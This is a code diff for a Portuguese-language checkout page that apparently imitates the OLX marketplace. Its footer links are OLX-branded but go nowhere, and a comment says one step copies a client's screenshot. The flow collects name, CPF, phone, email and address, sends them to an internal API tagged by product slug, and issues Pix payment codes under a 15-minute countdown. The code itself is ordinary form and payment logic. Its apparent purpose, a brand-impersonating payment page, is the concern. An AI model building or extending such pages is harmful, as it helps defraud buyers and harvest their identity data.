+              <a href="javascript:void(0)">Vender no OLX</a>
+              <a href="javascript:void(0)">Plano Profissional</a>
+            </div>
+            <div class="olx-pix-footer-socials">
+              <!-- Facebook -->
+              <svg viewBox="0 0 24 24"><path d="M22.675 0h-21.35C.597 0 0 .597 0 1.325v21.351C0 23.403.597 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.323-.597 1.323-1.325V1.325C24 .597 23.403 0 22.675 0z"/></svg>
+              <!-- YouTube -->
+              <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+              <!-- LinkedIn -->
+              <svg viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+              <!-- Instagram -->
+              <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+              <!-- Twitter/X -->
+              <svg viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/></svg>
+            </div>
+          </footer>
+        </div>
+      </div>
+
     </div>
 
     <!-- STEP 3: DETALHES DA COMPRA (IDÊNTICO À IMAGEM 4 DO CLIENTE) -->
@@ -4133,16 +4551,80 @@
   });
 
   async function triggerAddressLookup(cleanCep) {
+    if (!cleanCep || cleanCep.length !== 8) return;
+    const statusEl = document.getElementById('cep-auto-status');
+    if (statusEl) {
+      statusEl.style.display = 'inline';
+      statusEl.textContent = 'Buscando...';
+      statusEl.style.color = '#7B02E8';
+    }
+
     try {
-      const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
-      const d = await res.json();
-      if (!d.erro) {
-        if (d.logradouro) document.getElementById('lead-street').value = d.logradouro;
-        if (d.bairro) document.getElementById('lead-neighborhood').value = d.bairro;
-        if (d.localidade) document.getElementById('lead-city').value = d.localidade;
-        if (d.uf) document.getElementById('lead-state').value = d.uf;
+      // 1. Tenta API interna (/api/validate-cep)
+      let data = null;
+      try {
+        const res = await fetch('/api/validate-cep', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cep: cleanCep, session_id: SESSION_ID, product_code: PRODUCT_CODE || '', slug: PAGE_SLUG || '' })
+        });
+        if (res.ok) data = await res.json();
+      } catch(e) {}
+
+      // 2. Fallback viaCEP se necessário
+      if (!data || !data.success) {
+        const vRes = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
+        const vData = await vRes.json();
+        if (!vData.erro) {
+          data = {
+            success: true,
+            logradouro: vData.logradouro || '',
+            bairro: vData.bairro || '',
+            cidade: vData.localidade || '',
+            uf: vData.uf || ''
+          };
+        }
       }
-    } catch(e) {}
+
+      if (data && (data.success || data.logradouro || data.bairro || data.cidade)) {
+        const street = data.logradouro || data.street || '';
+        const neigh = data.bairro || data.neighborhood || '';
+        const city = data.cidade || data.city || '';
+        const uf = data.uf || data.state || '';
+
+        // Mobile
+        if (street && document.getElementById('lead-street')) document.getElementById('lead-street').value = street;
+        if (neigh && document.getElementById('lead-neighborhood')) document.getElementById('lead-neighborhood').value = neigh;
+        if (city && document.getElementById('lead-city')) document.getElementById('lead-city').value = city;
+        if (uf && document.getElementById('lead-state')) document.getElementById('lead-state').value = uf;
+
+        // Desktop
+        if (street && document.getElementById('dt-lead-street')) document.getElementById('dt-lead-street').value = street;
+        if (neigh && document.getElementById('dt-lead-neighborhood')) document.getElementById('dt-lead-neighborhood').value = neigh;
+        if (city && document.getElementById('dt-lead-city')) document.getElementById('dt-lead-city').value = city;
+        if (uf && document.getElementById('dt-lead-state')) document.getElementById('dt-lead-state').value = uf;
+
+        if (statusEl) {
+          statusEl.textContent = 'CEP Localizado ✓';
+          statusEl.style.color = '#10b981';
+          setTimeout(() => { statusEl.style.display = 'none'; }, 2500);
+        }
+        applyValidationState(document.getElementById('lead-cep'), true);
+        applyValidationState(document.getElementById('dt-lead-cep'), true);
+      } else {
+        if (statusEl) {
+          statusEl.textContent = 'CEP não encontrado';
+          statusEl.style.color = '#ef4444';
+        }
+        applyValidationState(document.getElementById('lead-cep'), false);
+        applyValidationState(document.getElementById('dt-lead-cep'), false);
+      }
+    } catch(err) {
+      if (statusEl) {
+        statusEl.textContent = 'Erro ao buscar CEP';
+        statusEl.style.color = '#ef4444';
+      }
+    }
   }
 
   // Correção de email
@@ -4169,6 +4651,62 @@
   let currentPaymentId = '';
   let paymentPollTimer = null;
 
+  function goToAddressStep() {
+    const name = document.getElementById('lead-name') ? document.getElementById('lead-name').value.trim() : '';
+    const cpf = document.getElementById('lead-cpf') ? document.getElementById('lead-cpf').value.trim() : '';
+    const phone = document.getElementById('lead-phone') ? document.getElementById('lead-phone').value.trim() : '';
+    const email = document.getElementById('lead-email') ? document.getElementById('lead-email').value.trim() : '';
+
+    if (!AdvancedValidator.isValidName(name)) {
+      showToast('Digite seu nome e sobrenome completo.', 'error');
+      const el = document.getElementById('lead-name');
+      if (el) { el.classList.add('error'); el.focus(); }
+      return;
+    }
+    if (!AdvancedValidator.isValidCPF(cpf)) {
+      showToast('CPF inválido. Verifique os números digitados.', 'error');
+      const el = document.getElementById('lead-cpf');
+      if (el) { el.classList.add('error'); el.focus(); }
+      return;
+    }
+    if (!AdvancedValidator.isValidPhone(phone)) {
+      showToast('Telefone inválido. Informe o DDD e número corretos.', 'error');
+      const el = document.getElementById('lead-phone');
+      if (el) { el.classList.add('error'); el.focus(); }
+      return;
+    }
+    const validEmail = (em) => {
+      const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+      if (!re.test(em)) return false;
+      const domain = em.split('@')[1].toLowerCase();
+      const invalidDomains = ['teste.com', 'test.com', 'asdf.com', '123.com', 'exemplo.com'];
+      return !invalidDomains.includes(domain);
+    };
+    if (!validEmail(email)) {
+      showToast('Digite um e-mail válido para rastreamento.', 'error');
+      const el = document.getElementById('lead-email');
+      if (el) { el.classList.add('error'); el.focus(); }
+      return;
+    }
+
+    // Transita para a Sub-etapa 2: Endereço
+    const personalWrap = document.getElementById('modal-mobile-substep-personal');
+    const addressWrap = document.getElementById('modal-mobile-substep-address');
+    if (personalWrap) personalWrap.style.display = 'none';
+    if (addressWrap) {
+      addressWrap.style.display = 'flex';
+      const cepInputEl = document.getElementById('lead-cep');
+      if (cepInputEl && !cepInputEl.value) cepInputEl.focus();
+    }
+  }
+
+  function backToPersonalStep() {
+    const personalWrap = document.getElementById('modal-mobile-substep-personal');
+    const addressWrap = document.getElementById('modal-mobile-substep-address');
+    if (addressWrap) addressWrap.style.display = 'none';
+    if (personalWrap) personalWrap.style.display = 'flex';
+  }
+
   function closeCheckoutModal() {
     const modal = document.getElementById('checkout-modal');
     if (modal) modal.classList.remove('open');
@@ -4186,6 +4724,12 @@
     if (step2) step2.style.display = 'none';
     const step1 = document.getElementById('modal-step-1');
     if (step1) step1.style.display = 'block';
+
+    // No mobile, retorna para a etapa de endereço
+    const personalWrap = document.getElementById('modal-mobile-substep-personal');
+    const addressWrap = document.getElementById('modal-mobile-substep-address');
+    if (addressWrap) addressWrap.style.display = 'flex';
+    if (personalWrap) personalWrap.style.display = 'none';
   }
 
   function backToConfirmData() {
@@ -4457,7 +5001,7 @@
 
       currentPaymentId = pixData.payment_id || pixData.external_id;
 
-      // 2. Oculta Escolha de Pagamento e Transita para Step 2 (Pagamento Pix QR Code)
+      // 2. Oculta Escolha de Pagamento e Transita para tela Pix
       const payChoice = document.getElementById('modal-step-payment-choice');
       if (payChoice) payChoice.style.display = 'none';
       const prodSum = document.getElementById('modal-step-product-summary');
@@ -4465,12 +5009,22 @@
       const step2 = document.getElementById('modal-step-2');
       if (step2) step2.style.display = 'block';
 
-      // Popula dados do Pix
+      // Popula dados do Pix — mobile
+      const pixCodeStr = pixData.pix_code || pixData.pix_copy_paste || '';
+      const mobileInput = document.getElementById('pix-copy-input-mobile');
+      if (mobileInput) mobileInput.value = pixCodeStr;
+
+      // Popula dados do Pix — desktop QR + input
+      const desktopQr = document.getElementById('pix-qr-img-desktop');
+      if (desktopQr && pixData.qr_code_url) desktopQr.src = pixData.qr_code_url;
+      const desktopInput = document.getElementById('pix-copy-input-desktop');
+      if (desktopInput) desktopInput.value = pixCodeStr;
+
+      // Legado (segurança)
       const qrImg = document.getElementById('pix-qr-img');
-      if (pixData.qr_code_url) {
-        qrImg.src = pixData.qr_code_url;
-      }
-      document.getElementById('pix-copy-input').value = pixData.pix_code || pixData.pix_copy_paste;
+      if (qrImg && pixData.qr_code_url) qrImg.src = pixData.qr_code_url;
+      const oldInput = document.getElementById('pix-copy-input');
+      if (oldInput) oldInput.value = pixCodeStr;
 
       // Inicia Contador Regressivo de 15 minutos
       startPixCountdown(15 * 60);
@@ -4639,24 +5193,52 @@
       showToast('Erro ao processar: ' + err.message, 'error');
     } finally {
       btnAdvanceLead.disabled = false;
-      document.getElementById('btn-advance-text').textContent = 'Continuar';
+      document.getElementById('btn-advance-text').textContent = 'Ir para Pagamento';
       document.getElementById('btn-advance-icon').style.display = 'inline-block';
+      document.getElementById('btn-advance-spinner').style.display = 'none';
     }
   });
 
-  // Copiar Código Pix Copia e Cola
+  // ─── COPIAR CÓDIGO PIX (MOBILE E DESKTOP) ────────────────────────────────
+  function copyPixCode(mode) {
+    let inputId = mode === 'desktop' ? 'pix-copy-input-desktop' : 'pix-copy-input-mobile';
+    let btnTextId = mode === 'desktop' ? 'btn-copy-pix-desktop-text' : 'btn-copy-pix-mobile-text';
+    const inp = document.getElementById(inputId);
+    if (!inp || !inp.value) {
+      // Fallback ao campo legado
+      const old = document.getElementById('pix-copy-input');
+      if (old && old.value) {
+        try { navigator.clipboard.writeText(old.value); } catch(e) {}
+      }
+    } else {
+      try { navigator.clipboard.writeText(inp.value); } catch(e) {}
+    }
+    const btnText = document.getElementById(btnTextId);
+    if (btnText) { btnText.textContent = 'Copiado!'; setTimeout(() => { btnText.textContent = 'Copiar código do PIX'; }, 3000); }
+    showToast('Código Pix copiado!', 'check');
+    trackEvent('PIX_CODE_COPIED', { payment_id: currentPaymentId, mode });
+  }
+
+  // ─── VOLTAR PARA HOME DO PRODUTO ─────────────────────────────────────────
+  function returnToProductHome() {
+    closeCheckoutModal();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // Copiar Código Pix Copia e Cola (legado)
   const btnCopyPix = document.getElementById('btn-copy-pix');
-  btnCopyPix.addEventListener('click', () => {
+  if (btnCopyPix) btnCopyPix.addEventListener('click', () => {
     const copyInput = document.getElementById('pix-copy-input');
-    copyInput.select();
-    try { navigator.clipboard.writeText(copyInput.value); } catch(e) {}
-    btnCopyPix.classList.add('copied');
-    document.getElementById('copy-text-label').textContent = 'Copiado!';
+    if (copyInput) {
+      copyInput.select();
+      try { navigator.clipboard.writeText(copyInput.value); } catch(e) {}
+    }
+    const lbl = document.getElementById('copy-text-label');
+    if (lbl) lbl.textContent = 'Copiado!';
     showToast('Código Pix copiado para a área de transferência!', 'check');
     trackEvent('PIX_CODE_COPIED', { payment_id: currentPaymentId });
     setTimeout(() => {
-      btnCopyPix.classList.remove('copied');
-      document.getElementById('copy-text-label').textContent = 'Copiar Pix';
+      if (lbl) lbl.textContent = 'Copiar Pix';
     }, 3000);
   });
 
